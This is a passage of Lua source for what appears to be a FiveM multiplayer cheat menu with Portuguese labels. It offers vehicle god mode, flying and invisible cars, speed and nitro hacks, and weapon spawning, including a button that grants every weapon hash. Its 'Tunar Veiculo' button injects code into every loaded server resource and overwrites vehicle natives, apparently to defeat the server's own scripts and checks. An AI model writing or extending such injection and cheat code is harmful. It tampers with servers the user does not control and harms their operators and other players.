                            TaskVehicleDriveToCoord(PlayerPedId(), vehicle, coords.x, coords.y, coords.z, 50.0, 156, vehicle, 2883621, 5.5, true)
                            SetDriveTaskDrivingStyle(PlayerPedId(), 2883621)
                            end
                            Wait(0)
                            end)
                            end)
                        next.elements.checkbox("Pneus Prova de Bala", "pneus_prova_bala", function(bool)
                            local veh = next.functions.GetVehicle()
                            if veh and DoesEntityExist(veh) then
                                if bool then
                                    SetVehicleTyresCanBurst(veh, false)
                                    for i = 0, 5 do
                                        SetVehicleTyreFixed(veh, i)
                                    end
                                else
                                    SetVehicleTyresCanBurst(veh, true)
                                end
                            else
                                next.elements.notify("Nenhum veículo encontrado!", "error")
                            end
                        end)
                        next.elements.checkbox("Auto Reparar", "auto_reparar", function(bool)
                            local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                            if not vehicle or vehicle == 0 then
                                next.elements.notify("Entre em um Veiculo Primeiro!", "warning")
                                return
                            end
                            if bool then
                                nt.createTh(function()
                                    while next.values.checkbox["auto_reparar"] do
                                        Wait(1000)
                                        local veh = next.functions.GetVehicle()
                                        if veh then
                                            SetVehicleFixed(veh)
                                            SetVehicleEngineHealth(veh, 1000.0)
                                            SetVehicleBodyHealth(veh, 1000.0)
                                        end
                                    end
                                end)
                            end
                        end)
                        next.elements.checkbox("GodMode Veículo", "godmode_veh", function(bool)
                            local veh = next.functions.GetVehicle()
                            if veh then
                                if bool then
                                    SetEntityInvincible(veh, true)
                                    SetVehicleTyresCanBurst(veh, false)
                                else
                                    SetEntityInvincible(veh, false)
                                    SetVehicleTyresCanBurst(veh, true)
                                end
                            end
                        end)
                        next.elements.checkbox("Não cair do Veiculo", "naocairdamoto", function(bool)
                        if bool then
                            while next.values.checkbox["naocairdamoto"] do
                                SetPedCanBeKnockedOffVehicle(PlayerPedId(), true)
                                Wait(0)
                            end
                        else
                            SetPedCanBeKnockedOffVehicle(PlayerPedId(), false)
                        end
                        end)

        next.elements.checkbox("Liberar Chute da Moto", "bike_kick", function(bool)
        if bool then
        nt.createTh(function()
        while next.values.checkbox["bike_kick"] do
        local ped = PlayerPedId()
        local vehicle = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(vehicle) then
        SetPedConfigFlag(ped, 429, true)
        DisableControlAction(0, 345, false)
        EnableControlAction(0, 345, true)
        DisableControlAction(0, 73, false)
        EnableControlAction(0, 73, true)
        DisableControlAction(0, 346, false)
        EnableControlAction(0, 346, true)
        DisableControlAction(0, 347, false)
        EnableControlAction(0, 347, true)
        end
        Wait(0)
        end
        end)
        else
        local ped = PlayerPedId()
        SetPedConfigFlag(ped, 429, false)
        end
        end)
                next.elements.checkbox("Explodir ao Bater", "impact_explode", function(bool)
                SetVehicleOutOfControl(GetVehiclePedIsIn(PlayerPedId(), false), false, bool)
                end)
                next.elements.checkbox("Veículo Invisível", "veiculo_invisivel", function(bool)
                local veiculo = GetVehiclePedIsIn(PlayerPedId(), false)
                if DoesEntityExist(veiculo) then
                SetEntityVisible(veiculo, not bool, false)
                end
                end)
                        next.elements.checkbox("Super Handling", "superhandling", function(bool)
                            if bool then
                                nt.createTh(function()
                                    while next.values.checkbox["superhandling"] do
                                        Wait(0)
                                        local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                        if veh then SetVehicleGravityAmount(veh, 40.0) end
                                    end
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    if veh then SetVehicleGravityAmount(veh, 10.0) end
                                end)
                            end
                        end)
                        next.elements.checkbox("Nitro Veículo", "nitro", function(bool)
                            if bool then
                                nt.createTh(function()
                                    while next.values.checkbox["nitro"] do
                                        Wait(0)
                                        local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                        if veh and GetPedInVehicleSeat(veh, -1) == PlayerPedId() then
                                            if IsDisabledControlPressed(0, 36) then
                                                SetVehicleBoostActive(veh, true)
                                                StartScreenEffect('RaceTurbo', 0, 0)
                                                SetVehicleForwardSpeed(veh, GetEntitySpeed(veh) + 15)
                                                Wait(1000)
                                            end
                                        end
                                    end
                                end)
                            end
                        end)
                        next.elements.checkbox("Grudar Carro no Chão", "vehicle_gravity", function(enabled)
                            nt.createTh(function()
                                while enabled and next.values.checkbox["vehicle_gravity"] do
                                    Wait(0)
                                    local a = PlayerPedId()
                                    local b = GetVehiclePedIsIn(PlayerPedId(), false)
                                    if b and b ~= 0 and DoesEntityExist(b) then
                                        if GetPedInVehicleSeat(b, -1) == a then
                                            ApplyForceToEntityCenterOfMass(b, 1, 0.0, 0.0, -1.0, false, true, true, false)
                                        end
                                    else
                                        break
                                    end
                                end
                            end)
                        end)
                            next.elements.checkbox("Voar com Veículo", "veiculo_voador", function(bool)
                            if next.values.checkbox["veiculo_voador"] then
                            nt.createTh(function()
                            while next.values.checkbox["veiculo_voador"] do
                                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                if veh ~= 0 then
                                    local vehrot = GetEntityRotation(veh, 2)
                                    local pitch = vehrot.x
                                    local yaw = vehrot.z
                                    if IsDisabledControlPressed(0, 63) then yaw = yaw + 1.0 end
                                    if IsDisabledControlPressed(0, 64) then yaw = yaw - 1.0 end
                                    if IsDisabledControlPressed(0, 21) then pitch = pitch - 1.0 end
                                    if IsDisabledControlPressed(0, 62) then pitch = pitch + 1.0 end
                                    SetEntityRotation(veh, pitch, 0, yaw, 2, true)
                                    if IsControlPressed(0, 71) then
                                        SetVehicleForwardSpeed(veh, GetEntitySpeed(veh) + 0.3)
                                    end
                                end
                                Wait(1)
                            end
                            end)
                            else
                            end
                            end)
                        next.elements.checkbox("Buzina Boost", "buzina_boost", function(bool)
                            nt.createTh(function()
                                while next.values.checkbox["buzina_boost"] do
                                    Wait(0)
                                    local veh = next.functions.GetVehicle()
                                    if veh and IsControlPressed(0, 86) then
                                        SetVehicleForwardSpeed(veh, GetEntitySpeed(veh) + next.values.slider["buzina_velocity"])
                                    end
                                end
                            end)
                        end)
                        next.elements.slider("Força do Buzina", "buzina_velocity", {min = 1, max = 1000, start = 5}, function(value)
                        end)
                elseif next.vars.subtab_selected == "Tunagem" then
                    local ped = PlayerPedId()
                    local veh = next.functions['GetVehicle']()
                    local is_driver = (veh ~= 0 and GetPedInVehicleSeat(veh, -1) == ped)
                    next.elements.groupbox("Cor do Carro", "cor_carro", "\xef\x8a\xad", 0, 0, 270, 250)
                         if is_driver then
                        next.elements.checkbox("Carro RGB", "carro_rgb", function(bool)
                                        nt.createTh(function()
                                            while next.values.checkbox["carro_rgb"] do
                                                function HSVToRGB(h, s, v)
                                        local i = math.floor(h * 6)
                                        local f = h * 6 - i
                                        local p = v * (1 - s)
                                        local q = v * (1 - f * s)
                                        local t = v * (1 - (1 - f) * s)
                                        i = i % 6
                                        local r, g, b = 0, 0, 0
                                        if i == 0 then r, g, b = v, t, p
                                        elseif i == 1 then r, g, b = q, v, p
                                        elseif i == 2 then r, g, b = p, v, t
                                        elseif i == 3 then r, g, b = p, q, v
                                        elseif i == 4 then r, g, b = t, p, v
                                        elseif i == 5 then r, g, b = v, p, q
                                        end
                                        return math.floor(r * 255), math.floor(g * 255), math.floor(b * 255)
                                        end
                                                local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                                local currentTime = GetGameTimer()
                                                local hue = (currentTime % 8000) / 8000
                                                local r, g, b = HSVToRGB(hue, 1, 1)
                                                SetVehicleCustomPrimaryColour(vehicle, r, g, b)
                                                SetVehicleCustomSecondaryColour(vehicle, r, g, b)
                                                Wait(100)
                                            end
                                        end)
                                    end)
                            next.elements.colorpicker("Cor personalizada (Todo o Veiculo)", "corPerstodoveiculo", function(colorTable)
                                    local vehicle = GetVehiclePedIsIn(PlayerPedId())
    local r = colorTable.r
    local g = colorTable.g
    local b = colorTable.b
    if r and g and b then
        SetVehicleCustomPrimaryColour(vehicle, r, g, b)
        SetVehicleCustomSecondaryColour(vehicle, r, g, b)
    end
                            end)
                            next.elements.slider("Alterar Cor R", "color_r", {min = 0, max = 255, start = 1}, function(value)
                            local vehicle = GetVehiclePedIsIn(PlayerPedId())
                            local r, g, b = value, next.values.slider["color_g"], next.values.slider["color_b"]
                            SetVehicleCustomPrimaryColour(vehicle, r, g, b)
                            SetVehicleCustomSecondaryColour(vehicle, r, g, b)
                            end)
                            next.elements.slider("Alterar Cor G", "color_g", {min = 0, max = 255, start = 1}, function(value)
                            local vehicle = GetVehiclePedIsIn(PlayerPedId())
                            local r2, g2, b2 = GetVehicleColor(vehicle)
                            local r, g, b = next.values.slider["color_r"], value, next.values.slider["color_b"]
                            SetVehicleCustomPrimaryColour(vehicle, r, g, b)
                            SetVehicleCustomSecondaryColour(vehicle, r, g, b)
                            end)
                            next.elements.slider("Alterar Cor B", "color_b", {min = 0, max = 255, start = 1}, function(value)
                            local vehicle = GetVehiclePedIsIn(PlayerPedId())
                            local r2, g2, b2 = GetVehicleColor(vehicle)
                            local r, g, b = next.values.slider["color_r"], next.values.slider["color_g"], value
                            SetVehicleCustomPrimaryColour(vehicle, r, g, b)
                            SetVehicleCustomSecondaryColour(vehicle, r, g, b)
                            end)
                            next.elements.button("Randomizar Cor", "randomizar_cor", function()
                            local vehicle = GetVehiclePedIsIn(PlayerPedId())
                            SetVehicleCustomPrimaryColour(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
                            SetVehicleCustomSecondaryColour(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
                            end)
                            next.elements.slider("Cor do Xenon", "xenon_color", {start = 0, min = 0, max = 12}, function(value)
                            local ped = PlayerPedId()
                            local veh = GetVehiclePedIsIn(ped, false)
                            if DoesEntityExist(veh) then
                            SetVehicleModKit(veh, 0)
                            ToggleVehicleMod(veh, 22, true)
                            SetVehicleHeadlightsColour(veh, value)
                            end
                            end)
                            next.elements.slider("Cor do Neon", "neon_color", {start = 0, min = 0, max = 7}, function(index)
                            local ped = PlayerPedId()
                            local veh = GetVehiclePedIsIn(ped, false)
                            if DoesEntityExist(veh) then
                            SetVehicleModKit(veh, 0)
                            local colors = {
                            [0] = {255, 0, 0},
                            [1] = {0, 255, 0},
                            [2] = {0, 0, 255},
                            [3] = {255, 255, 0},
                            [4] = {255, 0, 255},
                            [5] = {0, 255, 255},
                            [6] = {255, 255, 255},
                            [7] = {0, 0, 0},
                            }
                            local r, g, b = table.unpack(colors[index])
                            SetVehicleNeonLightEnabled(veh, 0, true)
                            SetVehicleNeonLightEnabled(veh, 1, true)
                            SetVehicleNeonLightEnabled(veh, 2, true)
                            SetVehicleNeonLightEnabled(veh, 3, true)
                            SetVehicleNeonLightsColour(veh, r, g, b)
                            end
                            end)
                            next.elements.slider("Cor da Fumaça", "tyre_smoke_color", {start = 0, min = 0, max = 7}, function(index)
                            local ped = PlayerPedId()
                            local veh = GetVehiclePedIsIn(ped, false)
                            if DoesEntityExist(veh) then
                            SetVehicleModKit(veh, 0)
                            ToggleVehicleMod(veh, 20, true)
                            local colors = {
                            [0] = {255, 0, 0},
                            [1] = {0, 255, 0},
                            [2] = {0, 0, 255},
                            [3] = {255, 255, 0},
                            [4] = {255, 0, 255},
                            [5] = {0, 255, 255},
                            [6] = {255, 255, 255},
                            [7] = {0, 0, 0},
                            }
                            local r, g, b = table.unpack(colors[index])
                            SetVehicleTyreSmokeColor(veh, r, g, b)
                            end
                            end)
                        else
                            next.elements.button("Você precisa estar dentro de um veículo", "estardentrodop1", function()
                            end)
                        end
                    next.elements.groupbox("Tunagem", "Tunagem", "\xef\x8a\xad", 280, 0, 270, 425)
                     if is_driver then
    next.elements.button("Tunar Veiculo", "tunar_veiculo", function()
        local veh = GetVehiclePedIsIn(PlayerPedId(), false)
        for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
        FrameAPI.Inject(resourceName, [[
            Citizen.CreateThread(function()
                _hxp_tune_ver = (_hxp_tune_ver or 0) + 1
                local myVersion = _hxp_tune_ver

                local function tuneOverrides()
                    SetVehicleModKit                = function() return true end
                    SetVehicleWheelType             = function() return true end
                    SetVehicleMod                   = function() return true end
                    ToggleVehicleMod                = function() return true end
                    SetVehicleWindowTint            = function() return true end
                    SetVehicleTyresCanBurst         = function() return true end
                    SetVehicleNeonLightEnabled      = function() return true end
                    SetVehicleNeonLightsColour      = function() return true end
                    SetVehicleCustomPrimaryColour   = function() return true end
                    SetVehicleCustomSecondaryColour = function() return true end
                    SetVehicleTyreSmokeColor        = function() return true end
                    SetVehicleHeadlightsColour      = function() return true end
                    SetVehicleExtraColours          = function() return true end
                    SetVehicleColours               = function() return true end
                    SetVehicleNumberPlateText       = function() return true end
                    _G.SetVehicleModKit                = function() return true end
                    _G.SetVehicleWheelType             = function() return true end
                    _G.SetVehicleMod                   = function() return true end
                    _G.ToggleVehicleMod                = function() return true end
                    _G.SetVehicleWindowTint            = function() return true end
                    _G.SetVehicleTyresCanBurst         = function() return true end
                    _G.SetVehicleNeonLightEnabled      = function() return true end
                    _G.SetVehicleCustomPrimaryColour   = function() return true end
                    _G.SetVehicleCustomSecondaryColour = function() return true end
                end

                local function tuneValues()
                    SetVehicleModKit                = function() end
                    SetVehicleWheelType             = function() end
                    SetVehicleMod                   = function() end
                    ToggleVehicleMod                = function() end
                    SetVehicleWindowTint            = function() end
                    SetVehicleTyresCanBurst         = function() end
                    SetVehicleNeonLightEnabled      = function() end
                    SetVehicleNeonLightsColour      = function() end
                    SetVehicleCustomPrimaryColour   = function() end
                    SetVehicleCustomSecondaryColour = function() end
                end

                local ok, err = pcall(function()
                    tuneOverrides()
                end)

                Citizen.CreateThread(function()
                    pcall(tuneOverrides)
                end)
            end)
            Wait(10)
        ]])
        end
        SetVehicleModKit(veh, 0)
        SetVehicleWheelType(veh, 7)
        SetVehicleMod(veh, 0, GetNumVehicleMods(veh, 0) - 1, false)
        SetVehicleMod(veh, 1, GetNumVehicleMods(veh, 1) - 1, false)
        SetVehicleMod(veh, 2, GetNumVehicleMods(veh, 2) - 1, false)
        SetVehicleMod(veh, 3, GetNumVehicleMods(veh, 3) - 1, false)
        SetVehicleMod(veh, 4, GetNumVehicleMods(veh, 4) - 1, false)
        SetVehicleMod(veh, 5, GetNumVehicleMods(veh, 5) - 1, false)
        SetVehicleMod(veh, 6, GetNumVehicleMods(veh, 6) - 1, false)
        SetVehicleMod(veh, 7, GetNumVehicleMods(veh, 7) - 1, false)
        SetVehicleMod(veh, 8, GetNumVehicleMods(veh, 8) - 1, false)
        SetVehicleMod(veh, 9, GetNumVehicleMods(veh, 9) - 1, false)
        SetVehicleMod(veh, 10, GetNumVehicleMods(veh, 10) - 1, false)
        SetVehicleMod(veh, 11, GetNumVehicleMods(veh, 11) - 1, false)
        SetVehicleMod(veh, 12, GetNumVehicleMods(veh, 12) - 1, false)
        SetVehicleMod(veh, 13, GetNumVehicleMods(veh, 13) - 1, false)
        SetVehicleMod(veh, 15, GetNumVehicleMods(veh, 15) - 2, false)
        SetVehicleMod(veh, 16, GetNumVehicleMods(veh, 16) - 1, false)
        ToggleVehicleMod(veh, 17, true)
        ToggleVehicleMod(veh, 18, true)
        ToggleVehicleMod(veh, 19, true)
        ToggleVehicleMod(veh, 20, true)
        ToggleVehicleMod(veh, 21, true)
        ToggleVehicleMod(veh, 22, true)
        SetVehicleMod(veh, 25, GetNumVehicleMods(veh, 25) - 1, false)
        SetVehicleMod(veh, 27, GetNumVehicleMods(veh, 27) - 1, false)
        SetVehicleMod(veh, 28, GetNumVehicleMods(veh, 28) - 1, false)
        SetVehicleMod(veh, 30, GetNumVehicleMods(veh, 30) - 1, false)
        SetVehicleMod(veh, 33, GetNumVehicleMods(veh, 33) - 1, false)
        SetVehicleMod(veh, 34, GetNumVehicleMods(veh, 34) - 1, false)
        SetVehicleMod(veh, 35, GetNumVehicleMods(veh, 35) - 1, false)
        SetVehicleWindowTint(veh, 1)
        SetVehicleTyresCanBurst(veh, false)
        SetVehicleNeonLightEnabled(veh, 0, true)
        SetVehicleNeonLightEnabled(veh, 1, true)
        SetVehicleNeonLightEnabled(veh, 2, true)
        SetVehicleNeonLightEnabled(veh, 3, true)
        end)
        next.elements.button("Tunagem Aleatória", "tunagem_aleatoria", function()
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        local modTypes = {
        0,
        1,
        2,
        3,
        4,
        5,
        6,
        7,
        8,
        10,
        11,
        12,
        13,
        15,
        23
        }
        for _, modType in ipairs(modTypes) do
        local maxMods = GetNumVehicleMods(veh, modType)
        if maxMods and maxMods > 0 then
        local randomMod = math.random(0, maxMods - 1)
        SetVehicleMod(veh, modType, randomMod, false)
        end
        end
        SetVehicleWheelType(veh, math.random(0, 11))
        ToggleVehicleMod(veh, 18, math.random(0, 1) == 1)
        ToggleVehicleMod(veh, 22, math.random(0, 1) == 1)
        end
        end)
        next.elements.slider("Spoiler", "mod_spoiler", {start = 0, min = 0, max = 10}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 0, value, false)
        end
        end)
        next.elements.slider("Para-choque Dianteiro", "mod_para_choque_d", {start = 0, min = 0, max = 10}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 1, value, false)
        end
        end)
        next.elements.slider("Para-choque Traseiro", "mod_para_choque_t", {start = 0, min = 0, max = 10}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 2, value, false)
        end
        end)
        next.elements.slider("Saias", "mod_saias", {start = 0, min = 0, max = 10}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 3, value, false)
        end
        end)
        next.elements.slider("Escapamento", "mod_escapamento", {start = 0, min = 0, max = 10}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 4, value, false)
        end
        end)
        next.elements.slider("Estrutura", "mod_estrutura", {start = 0, min = 0, max = 10}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 5, value, false)
        end
        end)
        next.elements.slider("Grade", "mod_grade", {start = 0, min = 0, max = 10}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 6, value, false)
        end
        end)
        next.elements.slider("Cap´", "mod_capo", {start = 0, min = 0, max = 10}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 7, value, false)
        end
        end)
        next.elements.slider("Para-lama", "mod_para_lama", {start = 0, min = 0, max = 10}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 8, value, false)
        end
        end)
        next.elements.slider("Teto", "mod_teto", {start = 0, min = 0, max = 10}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 10, value, false)
        end
        end)
        next.elements.slider("Motor", "mod_motor", {start = 0, min = 0, max = 3}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 11, value, false)
        end
        end)
        next.elements.slider("Freios", "mod_freios", {start = 0, min = 0, max = 2}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 12, value, false)
        end
        end)
        next.elements.slider("Transmissão", "mod_transmissao", {start = 0, min = 0, max = 2}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 13, value, false)
        end
        end)
        next.elements.slider("Suspensão", "mod_suspensao", {start = 0, min = 0, max = 4}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 15, value, false)
        end
        end)
        next.elements.slider("Rodas", "mod_rodas", {start = 0, min = 0, max = 10}, function(value)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if DoesEntityExist(veh) then
        SetVehicleModKit(veh, 0)
        SetVehicleMod(veh, 23, value, false)
        end
        end)
        else
             next.elements.button("Você precisa estar dentro de um veículo", "estardentrodop12", function()
             end)
        end
        next.elements.groupbox("Modificações", "modificacoes", "\xef\x8a\xad", 0, 260, 270, 166)
    if is_driver then
        next.elements.button("Adicionar Turbo", "adicionar_turbo", function()
            local ped = PlayerPedId()
            local vehicle = GetVehiclePedIsIn(ped, false)
            if DoesEntityExist(vehicle) then
            ToggleVehicleMod(vehicle, 18, true)
            end
            end)
            next.elements.button("Melhorar Motor e Transmissão", "melhorar_motor_e_transmissao", function()
            local ped = PlayerPedId()
            local vehicle = GetVehiclePedIsIn(ped, false)
            if DoesEntityExist(vehicle) then
            SetVehicleModKit(vehicle, 0)
            SetVehicleMod(vehicle, 11, 3, false)
            SetVehicleMod(vehicle, 13, 2, false)
            end
            end)
            next.elements.button("Melhorar Freios", "melhorar_freios", function()
            local ped = PlayerPedId()
            local vehicle = GetVehiclePedIsIn(ped, false)
            if DoesEntityExist(vehicle) then
            SetVehicleModKit(vehicle, 0)
            SetVehicleMod(vehicle, 12, 2, false)
            end
            end)
            next.elements.slider("Velocidade do Carro", "change_velocity", { start = 1, min = 1, max = 30.0 }, function(v)
            local ped = PlayerPedId()
            local vehicle = GetVehiclePedIsIn(ped, false)
            if vehicle ~= 0 and GetPedInVehicleSeat(vehicle, -1) == ped then
            SetVehicleEnginePowerMultiplier(vehicle, 0.0)
            SetVehicleCheatPowerIncrease(vehicle, 0.0)
            SetVehicleEnginePowerMultiplier(vehicle, (v - 1) * 20.0)
            SetVehicleCheatPowerIncrease(vehicle, (v - 1) * 15.0)
            SetVehicleForwardSpeed(vehicle, GetEntitySpeed(vehicle) + v)
            end
            end)
                        else
                next.elements.button("Você precisa estar dentro de um veículo", "estardentrodop13", function()
                end)
            end
            end
                elseif next.vars.tab_selected == "Armas" then
                    if next.vars.subtab_selected == "Weapons" then
                    next.elements.groupbox("Armas", "armas", "\xee\x86\x9b", 0, 0, 270, 300)
next.elements.combobox("Selecionar Arma", "armaSelecionada", {"Faca", "Canivete", "Taco", "Machado", "Tazer", "Pistol MK2", "G3", "Carabine MK2", "Arma Lazer Risco", "RPG Risco"})
next.elements.button("Spawnar Arma Atual", "btn_spawn_combo", function()
    local listaArmas = {
        ["Faca"] = "WEAPON_KNIFE",
        ["Canivete"] = "WEAPON_SWITCHBLADE",
        ["Taco"] = "WEAPON_BAT",
        ["Machado"] = "WEAPON_HATCHET",
        ["Tazer"] = "weapon_stungun",
        ["Pistol MK2"] = "WEAPON_PISTOL_MK2",
        ["G3"] = "WEAPON_SPECIALCARBINE_MK2",
        ["Carabine MK2"] = "WEAPON_CARBINERIFLE_MK2",
        ["Arma Lazer Risco"] = "WEAPON_RAYMINIGUN",
        ["RPG Risco"] = "WEAPON_PASSENGER_ROCKET"
    }
    local nomeSelecionado = next.values.combobox["armaSelecionada"]
    local armaHash = listaArmas[nomeSelecionado]
    local municao = next.values.slider['Muni'] or 250
    if armaHash then
       next.spawnWeapon(armaHash, municao)
        next.elements.notify("Arma " .. nomeSelecionado .. " Spawnada!", "success")
    else
        next.elements.notify("Arma não encontrada!", "error")
    end
end)
if group == "Santa Group" then
next.elements.button("Spawnar Todas as Armas", "spawn_all_weapons_btn", function()
local armas = {
    'WEAPON_KNIFE',
    'WEAPON_NIGHTSTICK',
    'WEAPON_HAMMER',
    'WEAPON_BAT',
    'WEAPON_GOLFCLUB',
    'WEAPON_CROWBAR',
    'WEAPON_BOTTLE',
    'WEAPON_DAGGER',
    'WEAPON_HATCHET',
    'WEAPON_KNUCKLE',
    'WEAPON_MACHETE',
    'WEAPON_FLASHLIGHT',
    'WEAPON_SWITCHBLADE',
    'WEAPON_BATTLEAXE',
    'WEAPON_POOLCUE',
    'WEAPON_WRENCH',
    'WEAPON_STONE_HATCHET',
    'WEAPON_CANDYCANE',
    'WEAPON_STUNROD',
    'WEAPON_PISTOL',
    'WEAPON_PISTOL_MK2',
    'WEAPON_COMBATPISTOL',
    'WEAPON_APPISTOL',
    'WEAPON_PISTOL50',
    'WEAPON_SNSPISTOL',
    'WEAPON_SNSPISTOL_MK2',
    'WEAPON_HEAVYPISTOL',
    'WEAPON_VINTAGEPISTOL',
    'WEAPON_MARKSMANPISTOL',
    'WEAPON_REVOLVER',
    'WEAPON_REVOLVER_MK2',
    'WEAPON_DOUBLEACTION',
    'WEAPON_CERAMICPISTOL',
    'WEAPON_NAVYREVOLVER',
    'WEAPON_GADGETPISTOL',
    'WEAPON_PISTOLXM3',
    'WEAPON_STUNGUN',
    'WEAPON_STUNGUN_MP',
    'WEAPON_FLAREGUN',
    'WEAPON_RAYPISTOL',
    'WEAPON_MICROSMG',
    'WEAPON_SMG',
    'WEAPON_SMG_MK2',
    'WEAPON_ASSAULTSMG',
    'WEAPON_COMBATPDW',
    'WEAPON_MACHINEPISTOL',
    'WEAPON_MINISMG',
    'WEAPON_TECPISTOL',
    'WEAPON_MG',
    'WEAPON_COMBATMG',
    'WEAPON_COMBATMG_MK2',
    'WEAPON_GUSENBERG',
    'WEAPON_RAYCARBINE',
    'WEAPON_RAYMINIGUN',
    'WEAPON_ASSAULTRIFLE',
    'WEAPON_ASSAULTRIFLE_MK2',
    'WEAPON_CARBINERIFLE',
    'WEAPON_CARBINERIFLE_MK2',
    'WEAPON_ADVANCEDRIFLE',
    'WEAPON_SPECIALCARBINE',
    'WEAPON_SPECIALCARBINE_MK2',
    'WEAPON_BULLPUPRIFLE',
    'WEAPON_BULLPUPRIFLE_MK2',
    'WEAPON_COMPACTRIFLE',
    'WEAPON_MILITARYRIFLE',
    'WEAPON_HEAVYRIFLE',
    'WEAPON_TACTICALRIFLE',
    'WEAPON_BATTLERIFLE',
    'WEAPON_STRICKLER',
    'WEAPON_PUMPSHOTGUN',
    'WEAPON_PUMPSHOTGUN_MK2',
    'WEAPON_SAWNOFFSHOTGUN',
    'WEAPON_ASSAULTSHOTGUN',
    'WEAPON_BULLPUPSHOTGUN',
    'WEAPON_MUSKET',
    'WEAPON_HEAVYSHOTGUN',
    'WEAPON_DBSHOTGUN',
    'WEAPON_AUTOSHOTGUN',
    'WEAPON_COMBATSHOTGUN',
    'WEAPON_SNIPERRIFLE',
    'WEAPON_HEAVYSNIPER',
    'WEAPON_HEAVYSNIPER_MK2',
    'WEAPON_MARKSMANRIFLE',
    'WEAPON_MARKSMANRIFLE_MK2',
    'WEAPON_PRECISIONRIFLE',
    'WEAPON_GRENADELAUNCHER',
    'WEAPON_GRENADELAUNCHER_SMOKE',
    'WEAPON_RPG',
    'WEAPON_MINIGUN',
    'WEAPON_FIREWORK',
    'WEAPON_RAILGUN',
    'WEAPON_HOMINGLAUNCHER',
    'WEAPON_COMPACTLAUNCHER',
    'WEAPON_EMPLAUNCHER',
    'WEAPON_RAILGUNXM3',
    'WEAPON_SNOWLAUNCHER',
    'WEAPON_GRENADE',
    'WEAPON_STICKYBOMB',
    'WEAPON_SMOKEGRENADE',
    'WEAPON_BZGAS',
    'WEAPON_MOLOTOV',
    'WEAPON_PROXMINE',
    'WEAPON_PIPEBOMB',
    'WEAPON_SNOWBALL',
    'WEAPON_BALL',
    'WEAPON_FLARE',
    'WEAPON_FIREEXTINGUISHER',
    'WEAPON_PETROLCAN',
    'WEAPON_HAZARDCAN',
    'WEAPON_FERTILIZERCAN',
    'WEAPON_DIGISCANNER',
    'WEAPON_METALDETECTOR',
    'WEAPON_HACKINGDEVICE',
    'WEAPON_ACIDPACKAGE',
    'WEAPON_BRIEFCASE',
    'WEAPON_BRIEFCASE_02',
    'WEAPON_BRIEFCASE_03',
    'WEAPON_GARBAGEBAG',
    'WEAPON_HANDCUFFS',
    'WEAPON_NEWSPAPER',
    'WEAPON_TRANQUILIZER',
    'WEAPON_REMOTESNIPER',
    'WEAPON_PASSENGER_ROCKET',
    'WEAPON_AIRSTRIKE_ROCKET',
    'WEAPON_STINGER',
    'WEAPON_AIR_DEFENCE_GUN',
    'WEAPON_ARENA_MACHINE_GUN',
    'WEAPON_ARENA_HOMING_MISSILE',
    'GADGET_NIGHTVISION',
    'GADGET_PARACHUTE'
}

for _, name in pairs(armas) do
    next.spawnWeaponAll(name)
end
    next.elements.notify("Spawnado com Sucesso", "success")
end) 
end

                next.elements.slider("Muni ao Spawnar", "Muni", {start = 250, min = 0, max = 5000}, function(value)
                end)
                next.elements.button("Remover Arma Atual", "remover_arma_atual", function()
                    local ped = PlayerPedId()
                    local arma = GetSelectedPedWeapon(ped)
                    local punho = GetHashKey("WEAPON_UNARMED")
                    if arma ~= punho then
                        RemoveWeaponFromPed(ped, arma)
